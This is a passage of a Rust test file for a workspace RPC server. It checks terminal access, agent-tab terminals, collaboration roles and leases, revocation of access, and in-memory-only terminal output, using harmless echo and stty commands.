    call(&f.rpc, &manager, "session.delete", json!({ "sessionId": session.id, "clientRequestId": "request-del-1" })).await.unwrap();
    let listed = call(&f.rpc, &manager, "pty.list", json!({})).await.unwrap();
    let ids: Vec<Option<&str>> = listed["terminals"].as_array().unwrap().iter().map(|t| t["sessionId"].as_str()).collect();
    assert_eq!(ids, vec![Some(outside.id.as_str()), None], "the deleted session's terminal is closed");
}

#[tokio::test(flavor = "multi_thread")]
async fn runtime_agents_lists_installed_agents_with_models_efforts_and_modes() {
    let f = fixture();
    f.rpc.set_offered_for_tests(installed_agents());
    let (peer, _events) = hello_with(&f.rpc, "device-desk", Authority::Manage, &["agents/1"]).await;
    let listed = call(&f.rpc, &peer, "runtime.agents", json!({})).await.unwrap();
    let agents = listed["agents"].as_array().unwrap();
    let ids: Vec<&str> = agents.iter().map(|agent| agent["id"].as_str().unwrap()).collect();
    assert_eq!(ids, vec!["claude", "codex"], "only installed agents");
    let claude = &agents[0];
    assert_eq!(claude["name"], "Claude Code");
    assert_eq!(claude["defaultMode"], index::DEFAULT_PERMISSION_MODE);
    assert_eq!(claude["modes"], json!(PERMISSION_MODES));
    assert_eq!(claude["caps"]["effort"], true);
    let opus = claude["models"].as_array().unwrap().iter().find(|model| model["id"] == "opus").unwrap();
    assert_eq!(opus["isDefault"], true);
    assert!(opus["efforts"].as_array().unwrap().iter().any(|effort| effort == "high"));
    assert!(!agents[1]["models"].as_array().unwrap().is_empty(), "codex models come from its list");
    // A path on the VM never leaves it.
    assert!(!listed.to_string().contains("/home/vm"));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_terminal_names_its_session_only_to_pty_2_peers_that_may_see_it() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let session = seed_session(&f.root, "Fix login", None);
    let (manager, _events) = hello_with(&f.rpc, "device-desk", Authority::Manage, &protocol::CAPABILITIES).await;
    let created = call(&f.rpc, &manager, "pty.create", json!({ "sessionId": session.id, "clientRequestId": "request-scope-1" })).await.unwrap();
    let pty_id = created["ptyId"].as_str().unwrap().to_string();

    // A pty/1 manager sees the terminal, not the session it belongs to.
    let (old, _old_events) = hello_with(&f.rpc, "device-old", Authority::Manage, SESSION_1).await;
    let listed = call(&f.rpc, &old, "pty.list", json!({})).await.unwrap();
    assert_eq!(listed["terminals"][0]["ptyId"], pty_id.as_str());
    assert!(listed["terminals"][0].get("sessionId").is_none());
    let attached = call(&f.rpc, &old, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    assert!(attached.get("sessionId").is_none());
    let controlled = call(&f.rpc, &old, "pty.control", json!({ "ptyId": pty_id })).await.unwrap();
    assert!(controlled.get("sessionId").is_none());

    // A participant with pty/2 is not shown a session that is not shared with it.
    let (participant, _part_events) = hello_with(&f.rpc, "device-phone", Authority::Participate, &protocol::CAPABILITIES).await;
    let listed = call(&f.rpc, &participant, "pty.list", json!({})).await.unwrap();
    assert!(listed["terminals"][0].get("sessionId").is_none());
    let attached = call(&f.rpc, &participant, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    assert!(attached.get("sessionId").is_none());

    // The pty/2 manager, who may see the session, is told it.
    let listed = call(&f.rpc, &manager, "pty.list", json!({})).await.unwrap();
    assert_eq!(listed["terminals"][0]["sessionId"], session.id.as_str());
    let attached = call(&f.rpc, &manager, "pty.attach", json!({ "ptyId": pty_id })).await.unwrap();
    assert_eq!(attached["sessionId"], session.id.as_str());
}

#[tokio::test(flavor = "multi_thread")]
async fn closing_a_sessions_last_tab_with_remove_closes_its_terminals() {
    let _home = crate::store::temp_home();
    let f = fixture();
    let session = seed_session(&f.root, "Fix login", None);
    let kept = seed_session(&f.root, "Keep me", None);
    let (manager, _events) = hello_with(&f.rpc, "device-desk", Authority::Manage, &protocol::CAPABILITIES).await;
    for (session_id, request) in [(&session.id, "request-close-1"), (&kept.id, "request-close-2")] {
        call(&f.rpc, &manager, "pty.create", json!({ "sessionId": session_id, "clientRequestId": request })).await.unwrap();
    }
    let tab_id = session.tabs[0].id.clone();
    call(&f.rpc, &manager, "session.close", json!({ "sessionId": session.id, "tabId": tab_id, "remove": true, "clientRequestId": "request-close-3" }))
        .await
        .unwrap();
    assert!(index::get(&session.id).is_err(), "its last tab went, so the session did");
    let listed = call(&f.rpc, &manager, "pty.list", json!({})).await.unwrap();
    let ids: Vec<Option<&str>> = listed["terminals"].as_array().unwrap().iter().map(|t| t["sessionId"].as_str()).collect();
    assert_eq!(ids, vec![Some(kept.id.as_str())], "the removed session's terminal is closed, others stay");
}

// ---- an agent tab's own terminal (PRO-86, `agent-pty/1`) -----------------------

const AGENT_TERMINAL: &str = "tab:tab-1";
const WITH_AGENT_PTY: [&str; 7] = ["pty/1", "fs/1", "session/1", "keys/1", "collab/1", "lifecycle/1", protocol::AGENT_PTY];

/// Stands in for the tab's CLI: a shell in the pane the session manager
/// starts it in. Nothing here goes through the RPC: the agent runs whether
/// or not anyone looks at its terminal.
fn start_agent_cli(f: &Fixture) -> u32 {
    let cwd = f.root.to_string_lossy().into_owned();
    let (cols, rows) = crate::session::CLI_PANE_SIZE;
    f.terminals.spawn(f.sink.clone(), AGENT_TERMINAL, PaneSpec { cwd: &cwd, cols, rows, command: None, env: &[] }).unwrap();
    f.terminals.pid(AGENT_TERMINAL).expect("the CLI has a process")
}

async fn agent_person(rpc: &Arc<WorkspaceRpc>, device: &str, authority: Authority, user: &str) -> (Arc<Peer>, Notifications) {
    let (peer, events) = Peer::for_user(device.into(), authority, Some(user.into()));
    call(rpc, &peer, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
    (peer, events)
}

/// Everything under the fixture's directory, with sizes: what the runtime has on disk.
fn files_on_disk(dir: &Path) -> Vec<(String, u64)> {
    let mut found = Vec::new();
    let mut pending = vec![dir.to_path_buf()];
    while let Some(next) = pending.pop() {
        for entry in std::fs::read_dir(&next).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                pending.push(path);
            } else {
                found.push((path.to_string_lossy().into_owned(), entry.metadata().map(|meta| meta.len()).unwrap_or(0)));
            }
        }
    }
    found.sort();
    found
}

fn shared(f: &Fixture) {
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager", "canApprove": true },
        { "userId": "alice", "role": "driver", "canApprove": true },
        { "userId": "dave", "role": "driver", "canApprove": true },
        // Drives from the chat, but may not approve what the agent asks.
        { "userId": "erin", "role": "driver", "canApprove": false },
        // Approves from the chat's cards, but does not drive.
        { "userId": "bob", "role": "viewer", "canApprove": true },
    ])));
}

#[tokio::test(flavor = "multi_thread")]
async fn an_agent_terminal_needs_its_capability_and_is_never_a_shell() {
    let f = fixture();
    with_tab(&f);
    start_agent_cli(&f);
    // A client that never asked for it (an older desktop) cannot reach it.
    let (old, _events) = Peer::new("device-old".into(), Authority::Manage);
    let hello = call(&f.rpc, &old, "rpc.hello", json!({ "protocol": PROTOCOL, "want": ALL })).await.unwrap();
    assert!(!hello["capabilities"].as_array().unwrap().iter().any(|capability| capability == protocol::AGENT_PTY));
    for method in ["pty.attach", "pty.control", "pty.resize"] {
        assert_eq!(
            code(call(&f.rpc, &old, method, json!({ "ptyId": AGENT_TERMINAL, "cols": 80, "rows": 24 })).await),
            "capability_not_granted",
            "{method}"
        );
    }
    assert_eq!(
        code(call(&f.rpc, &old, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1 })).await),
        "capability_not_granted"
    );

    let (desk, _events) = Peer::new("device-desk".into(), Authority::Manage);
    let hello = call(&f.rpc, &desk, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
    assert!(hello["capabilities"].as_array().unwrap().iter().any(|capability| capability == protocol::AGENT_PTY), "advertised when asked for");
    let attached = call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((attached["tabId"].as_str(), attached["running"].as_bool()), (Some("tab-1"), Some(true)));
    // It is the tab's, not a shell tab: not listed, not counted, not killable.
    assert_eq!(call(&f.rpc, &desk, "pty.list", json!({})).await.unwrap()["terminals"], json!([]));
    assert_eq!(call(&f.rpc, &desk, "lifecycle.dispositionFacts", json!({})).await.unwrap()["runningProcesses"], 0);
    assert_eq!(code(call(&f.rpc, &desk, "pty.kill", json!({ "ptyId": AGENT_TERMINAL })).await), "forbidden");
    assert!(f.terminals.is_running(AGENT_TERMINAL));
    // Only tabs the runtime has, by exact id.
    assert_eq!(code(call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": "tab:tab-9" })).await), "not_found");
    assert_eq!(code(call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": "tab:" })).await), "not_found");
}

#[tokio::test(flavor = "multi_thread")]
async fn attaching_to_an_agent_terminal_replays_its_screen_and_never_restarts_the_cli() {
    let f = fixture();
    with_tab(&f);
    let pid = start_agent_cli(&f);
    // The agent draws before anyone looks.
    f.terminals.write(AGENT_TERMINAL, b"echo agent-$((40+2))-screen\n").unwrap();
    let deadline = std::time::Instant::now() + Duration::from_secs(60);
    while !f.terminals.read_output(AGENT_TERMINAL).is_some_and(|out| String::from_utf8_lossy(&out).contains("agent-42-screen")) {
        assert!(std::time::Instant::now() < deadline, "the shell never answered");
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    let (desk, mut events) = Peer::new("device-desk".into(), Authority::Manage);
    call(&f.rpc, &desk, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
    let attached = call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    let replay = String::from_utf8_lossy(&STANDARD.decode(attached["data"].as_str().unwrap()).unwrap()).into_owned();
    assert!(replay.contains("agent-42-screen"), "recent output is replayed on attach: {replay}");
    assert_eq!(attached["offset"], 0);
    assert_eq!(attached["control"], "none", "nobody controls it until someone asks");
    let (cols, rows) = crate::session::CLI_PANE_SIZE;
    assert_eq!((attached["cols"].as_u64(), attached["rows"].as_u64()), (Some(cols as u64), Some(rows as u64)));

    // Watching types nothing; the controller's input reaches the same process.
    assert_eq!(code(call(&f.rpc, &desk, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w" })).await), "not_controller");
    let taken = call(&f.rpc, &desk, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "cols": 100, "rows": 40 })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["cols"].as_u64(), taken["rows"].as_u64()), (Some("you"), Some(100), Some(40)));
    call(&f.rpc, &desk, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo typed-$$-here\n", "seq": 1, "writerId": "w" })).await.unwrap();
    let (_, end) = output_until(&mut events, &format!("typed-{pid}-here")).await;
    assert_eq!(f.terminals.pid(AGENT_TERMINAL), Some(pid), "attach, control and input never restart the agent");

    // Leaving the view (detach) and coming back resumes after the last byte.
    call(&f.rpc, &desk, "pty.detach", json!({ "subscriptionId": attached["subscriptionId"] })).await.unwrap();
    let resumed = call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL, "sinceOffset": end, "runtimeGeneration": 7 })).await.unwrap();
    assert_eq!(resumed["offset"].as_u64(), Some(end));
    assert_eq!(resumed["control"], "you");
    assert_eq!(f.terminals.pid(AGENT_TERMINAL), Some(pid));
    // `start` on a running CLI starts nothing.
    call(&f.rpc, &desk, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "start": true })).await.unwrap();
    assert_eq!(f.terminals.pid(AGENT_TERMINAL), Some(pid));
}

#[tokio::test(flavor = "multi_thread")]
async fn only_the_lease_holder_types_into_an_agent_terminal_and_a_manager_takes_it_over() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    let pid = start_agent_cli(&f);
    let (admin, _admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, mut alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (dave, _dave_events) = agent_person(&f.rpc, "d-dave", Authority::Participate, "dave").await;
    let (bob, mut bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let (carol, _carol_events) = agent_person(&f.rpc, "d-carol", Authority::Participate, "carol").await;
    let write = |seq: u64, data: &str| json!({ "ptyId": AGENT_TERMINAL, "data": data, "seq": seq, "writerId": "w" });

    // Not shared with carol: the agent's screen is not hers to see.
    assert_eq!(code(call(&f.rpc, &carol, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await), "forbidden");
    // A viewer watches, read-only.
    call(&f.rpc, &bob, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    for (method, params) in [
        ("pty.control", json!({ "ptyId": AGENT_TERMINAL })),
        ("pty.write", write(1, "x")),
        ("pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 10, "rows": 10 })),
    ] {
        assert_eq!(code(call(&f.rpc, &bob, method, params).await), "forbidden", "{method}");
    }

    // A driver who may not approve watches too: the agent's own screen
    // answers its permission prompts and changes its mode.
    let (erin, _erin_events) = agent_person(&f.rpc, "d-erin", Authority::Participate, "erin").await;
    call(&f.rpc, &erin, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    let refused = f.rpc.handle(&erin, &json!({ "id": "1", "method": "pty.control", "params": { "ptyId": AGENT_TERMINAL } })).await;
    assert_eq!((refused["error"]["code"].as_str(), refused["error"]["data"]["needs"].as_str()), (Some("forbidden"), Some("canApprove")));
    assert_eq!(code(call(&f.rpc, &erin, "pty.write", write(1, "x")).await), "forbidden");
    assert_eq!(code(call(&f.rpc, &erin, "pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 10, "rows": 10 })).await), "forbidden");

    // A driver takes control and types; what she types claims the tab.
    call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    let taken = call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["controllerId"].as_str()), (Some("you"), Some("alice")));
    let told = next_event(&mut bob_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].as_str()), (Some("other"), Some("alice")), "watchers see who controls it");
    assert_eq!(call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap()["leases"], json!([]), "control alone drives nothing");
    call(&f.rpc, &alice, "pty.write", write(1, "echo alice-$$-typed\n")).await.unwrap();
    output_until(&mut bob_events, &format!("alice-{pid}-typed")).await;
    assert_eq!(call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap()["leases"][0]["holderId"], "alice");

    // A driver without the lease cannot type, size or take the terminal.
    let refused = f.rpc.handle(&dave, &json!({ "id": "1", "method": "pty.control", "params": { "ptyId": AGENT_TERMINAL } })).await;
    assert_eq!(refused["error"]["code"], "lease_held");
    assert_eq!(refused["error"]["data"]["lease"]["holderId"], "alice");
    assert_eq!(code(call(&f.rpc, &dave, "pty.write", write(1, "x")).await), "lease_held");
    assert_eq!(code(call(&f.rpc, &dave, "pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 10, "rows": 10 })).await), "lease_held");
    // Nor a manager, until they take the tab over by taking the terminal.
    assert_eq!(code(call(&f.rpc, &admin, "pty.write", write(1, "x")).await), "lease_held");
    let taken = call(&f.rpc, &admin, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["controllerId"].as_str()), (Some("you"), Some("admin")));
    assert_eq!(call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap()["leases"][0]["holderId"], "admin");
    // Her own view was told she had it, then that the admin took it.
    assert_eq!(next_event(&mut alice_events, "pty.control").await["control"], "you");
    let told = next_event(&mut alice_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].as_str()), (Some("other"), Some("admin")));
    assert_eq!(code(call(&f.rpc, &alice, "pty.write", write(2, "x")).await), "lease_held");
    call(&f.rpc, &admin, "pty.write", write(1, "echo admin-$$-typed\n")).await.unwrap();
    output_until(&mut bob_events, &format!("admin-{pid}-typed")).await;
    assert_eq!(f.terminals.pid(AGENT_TERMINAL), Some(pid));
}

#[tokio::test(flavor = "multi_thread")]
async fn a_second_viewer_never_resizes_the_controllers_agent_terminal() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    start_agent_cli(&f);
    let (alice, _alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (dave, mut dave_events) = agent_person(&f.rpc, "d-dave", Authority::Participate, "dave").await;
    let (bob, _bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    call(&f.rpc, &dave, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "cols": 100, "rows": 40 })).await.unwrap();
    let told = next_event(&mut dave_events, "pty.resized").await;
    assert_eq!((told["cols"].as_u64(), told["rows"].as_u64()), (Some(100), Some(40)), "a watcher is told the controller's size");
    // Another driver's window (the lease is free) and a viewer's: neither resizes it.
    assert_eq!(code(call(&f.rpc, &dave, "pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 60, "rows": 20 })).await), "not_controller");
    assert_eq!(code(call(&f.rpc, &bob, "pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 60, "rows": 20 })).await), "forbidden");
    let seen = call(&f.rpc, &bob, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((seen["cols"].as_u64(), seen["rows"].as_u64()), (Some(100), Some(40)));
    // The program really is that size.
    call(&f.rpc, &alice, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo size-$(stty size | tr ' ' x)-ok\n", "seq": 1, "writerId": "w" })).await.unwrap();
    output_until(&mut dave_events, "size-40x100-ok").await;
    let resized = call(&f.rpc, &alice, "pty.resize", json!({ "ptyId": AGENT_TERMINAL, "cols": 90, "rows": 30 })).await.unwrap();
    assert_eq!((resized["cols"].as_u64(), resized["rows"].as_u64()), (Some(90), Some(30)));
}

#[tokio::test(flavor = "multi_thread")]
async fn revoked_access_ends_an_agent_terminal_stream() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    let pid = start_agent_cli(&f);
    let (alice, mut alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (bob, mut bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &bob, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!(next_event(&mut bob_events, "pty.control").await["controllerId"], "alice");
    // Downgraded to a viewer: control goes, announced, and the next keystroke is refused.
    // Approval rights taken back: her next keystroke is refused, at once.
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "bob", "role": "viewer" },
    ])));
    assert_eq!(
        code(call(&f.rpc, &alice, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w" })).await),
        "forbidden"
    );
    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "viewer" },
        { "userId": "bob", "role": "viewer" },
    ])));
    let told = next_event(&mut bob_events, "pty.control").await;
    assert_eq!((told["control"].as_str(), told["controllerId"].clone()), (Some("none"), Value::Null));
    assert_eq!(
        code(call(&f.rpc, &alice, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w" })).await),
        "forbidden"
    );
    // Revoked: her connection is closed, and no output is sent to it any more.
    f.rpc.set_collaboration(members(json!([{ "userId": "admin", "role": "manager" }, { "userId": "bob", "role": "viewer" }])));
    tokio::time::timeout(Duration::from_secs(5), alice.closed()).await.expect("alice's connection is closed");
    f.rpc.disconnect(&alice);
    while tokio::time::timeout(Duration::from_millis(200), alice_events.recv()).await.is_ok() {}
    f.terminals.write(AGENT_TERMINAL, b"echo after-$$-revocation\n").unwrap();
    output_until(&mut bob_events, &format!("after-{pid}-revocation")).await;
    assert!(tokio::time::timeout(Duration::from_millis(200), alice_events.recv()).await.is_err(), "nothing streams to a revoked person");
    assert_eq!(code(call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await), "forbidden");
}

#[tokio::test(flavor = "multi_thread")]
async fn an_agent_terminal_outlives_its_cli_and_keeps_nothing_on_disk() {
    let f = fixture();
    with_tab(&f);
    let (desk, mut events) = Peer::new("device-desk".into(), Authority::Manage);
    call(&f.rpc, &desk, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
    // Before the tab's CLI ever ran: there is a terminal to watch, and nothing in it.
    let attached = call(&f.rpc, &desk, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((attached["running"].as_bool(), attached["data"].as_str()), (Some(false), Some("")));
    let taken = call(&f.rpc, &desk, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "cols": 100, "rows": 40 })).await.unwrap();
    assert_eq!((taken["control"].as_str(), taken["running"].as_bool()), (Some("you"), Some(false)), "taking control starts nothing");
    assert!(!f.terminals.is_live(AGENT_TERMINAL));
    assert_eq!(
        code(call(&f.rpc, &desk, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "x", "seq": 1, "writerId": "w" })).await),
        "unavailable",
        "there is no agent to type into"
    );
    let before = files_on_disk(f._dir.path());

    // The CLI starts (a send, or `start`): the view already attached shows
    // it, at the controller's size.
    let first = start_agent_cli(&f);
    call(&f.rpc, &desk, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo first-$$-$(stty size | tr ' ' x)\n", "seq": 1, "writerId": "w" }))
        .await
        .unwrap();
    let (_, end) = output_until(&mut events, &format!("first-{first}-40x100")).await;
    // It exits and the tab resumes in the same pane: the same stream carries on.
    f.terminals.kill_and_wait(AGENT_TERMINAL, Duration::from_secs(10));
    let second = start_agent_cli(&f);
    assert_ne!(first, second);
    let deadline = tokio::time::Instant::now() + Duration::from_secs(60);
    loop {
        let sent = call(&f.rpc, &desk, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "echo second-$$-$(stty size | tr ' ' x)\n", "seq": 2, "writerId": "w" })).await;
        match sent {
            Ok(_) => break,
            // The new CLI's pane is not up for a moment.
            Err((code, _)) if code == "unavailable" && tokio::time::Instant::now() < deadline => tokio::time::sleep(Duration::from_millis(20)).await,
            Err(error) => panic!("{error:?}"),
        }
    }
    let (_, later) = output_until(&mut events, &format!("second-{second}-40x100")).await;
    assert!(later > end, "one stream of offsets across both CLIs");

    // Screen and keystrokes live in memory only: nothing was written under the runtime's data.
    assert_eq!(files_on_disk(f._dir.path()), before);
}

// ---- review of PRO-86 -----------------------------------------------------------

#[tokio::test(flavor = "multi_thread")]
async fn a_terminals_own_reports_reach_the_program_without_driving_or_counting_as_use() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    let pid = start_agent_cli(&f);
    let (alice, mut alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (dave, _dave_events) = agent_person(&f.rpc, "d-dave", Authority::Participate, "dave").await;
    let (bob, _bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    let report = |seq: u64, data: &str| json!({ "ptyId": AGENT_TERMINAL, "data": data, "seq": seq, "writerId": "w", "report": true });
    call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    // A focus report from someone only watching goes nowhere, whoever they are.
    assert_eq!(code(call(&f.rpc, &dave, "pty.write", report(1, "\u{1b}[I")).await), "not_controller");
    assert_eq!(code(call(&f.rpc, &bob, "pty.write", report(1, "\u{1b}[I")).await), "forbidden");

    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    // The controller's terminal answers a query: the program gets the bytes...
    call(&f.rpc, &alice, "pty.write", report(1, "echo report-$$-in\n")).await.unwrap();
    output_until(&mut alice_events, &format!("report-{pid}-in")).await;
    // ...but nobody drove the tab, and the workspace was not used.
    assert_eq!(call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap()["leases"], json!([]));
    assert_eq!(f.rpc.input_activity.load(Ordering::SeqCst), 0);
    // Reports do not extend a lease either.
    f.rpc.collab.claim("tab-1", "alice", 1, false, false).unwrap();
    call(&f.rpc, &alice, "pty.write", report(2, "\u{1b}[O")).await.unwrap();
    assert_eq!(call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap()["leases"], json!([]), "the old lease stays expired");
    // A key does both.
    call(&f.rpc, &alice, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "\n", "seq": 3, "writerId": "w" })).await.unwrap();
    assert_eq!(call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap()["leases"][0]["holderId"], "alice");
    assert_eq!(f.rpc.input_activity.load(Ordering::SeqCst), 1);

    // The same for a shell: its emulator's reports are not use of the workspace.
    let (admin, _admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let shell = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-report-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &admin, "pty.write", json!({ "ptyId": shell, "data": "\u{1b}[I", "seq": 1, "writerId": "w", "report": true })).await.unwrap();
    assert_eq!(f.rpc.input_activity.load(Ordering::SeqCst), 1);
    call(&f.rpc, &admin, "pty.write", json!({ "ptyId": shell, "data": "true\n", "seq": 2, "writerId": "w" })).await.unwrap();
    assert_eq!(f.rpc.input_activity.load(Ordering::SeqCst), 2);
}

#[tokio::test(flavor = "multi_thread")]
async fn withdrawing_approval_rights_takes_the_agent_terminal_and_frees_the_tab() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    start_agent_cli(&f);
    let (admin, _admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    let (bob, mut bob_events) = agent_person(&f.rpc, "d-bob", Authority::Participate, "bob").await;
    call(&f.rpc, &bob, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!(next_event(&mut bob_events, "pty.control").await["controllerId"], "alice");
    call(&f.rpc, &alice, "pty.write", json!({ "ptyId": AGENT_TERMINAL, "data": "\n", "seq": 1, "writerId": "w" })).await.unwrap();
    // She also controls a shell, which needs the same right (PRO-88).
    let shell = call(&f.rpc, &admin, "pty.create", json!({ "clientRequestId": "request-approve-1" })).await.unwrap()["ptyId"].as_str().unwrap().to_string();
    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": shell })).await.unwrap();

    f.rpc.set_collaboration(members(json!([
        { "userId": "admin", "role": "manager" },
        { "userId": "alice", "role": "driver", "canApprove": false },
        { "userId": "bob", "role": "viewer" },
    ])));
    let told = next_event(&mut bob_events, "pty.control").await;
    assert_eq!((told["ptyId"].as_str(), told["control"].as_str(), told["controllerId"].clone()), (Some(AGENT_TERMINAL), Some("none"), Value::Null));
    let state = call(&f.rpc, &bob, "collab.state", json!({})).await.unwrap();
    assert_eq!(state["leases"], json!([]), "the tab she held by typing is free again");
    let attached = call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!(attached["control"], "none");
    // Still a driver, but a shell is no more hers than the agent's terminal.
    assert_eq!(call(&f.rpc, &alice, "pty.attach", json!({ "ptyId": shell })).await.unwrap()["control"], "none");
    assert_eq!(code(call(&f.rpc, &alice, "pty.control", json!({ "ptyId": shell })).await), "forbidden");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_refused_take_of_an_agent_terminal_moves_nothing() {
    let f = fixture();
    with_tab(&f);
    shared(&f);
    let (admin, _admin_events) = agent_person(&f.rpc, "d-admin", Authority::Manage, "admin").await;
    let (alice, _alice_events) = agent_person(&f.rpc, "d-alice", Authority::Participate, "alice").await;
    call(&f.rpc, &alice, "pty.control", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    f.rpc.collab.claim("tab-1", "alice", crate::cloud_agents::now_ms(), false, false).unwrap();
    // A handle from another runtime process: refused before the tab is taken over.
    assert_eq!(code(call(&f.rpc, &admin, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "epoch": "epoch-old" })).await), "not_found");
    // This fixture runs no agents (there is no session manager), so a start
    // cannot be served: it is refused before control or the lease moves.
    assert_eq!(code(call(&f.rpc, &admin, "pty.control", json!({ "ptyId": AGENT_TERMINAL, "start": true })).await), "unavailable");
    assert_eq!(call(&f.rpc, &admin, "collab.state", json!({})).await.unwrap()["leases"][0]["holderId"], "alice");
    let seen = call(&f.rpc, &admin, "pty.attach", json!({ "ptyId": AGENT_TERMINAL })).await.unwrap();
    assert_eq!((seen["control"].as_str(), seen["controllerId"].as_str()), (Some("other"), Some("alice")));
}

#[tokio::test(flavor = "multi_thread")]
async fn closing_a_tab_drops_its_terminal_and_what_it_kept() {
    let f = fixture();
    with_tab(&f);
    let pid = start_agent_cli(&f);
    let (desk, mut events) = Peer::new("device-desk".into(), Authority::Manage);
    call(&f.rpc, &desk, "rpc.hello", json!({ "protocol": PROTOCOL, "want": WITH_AGENT_PTY })).await.unwrap();
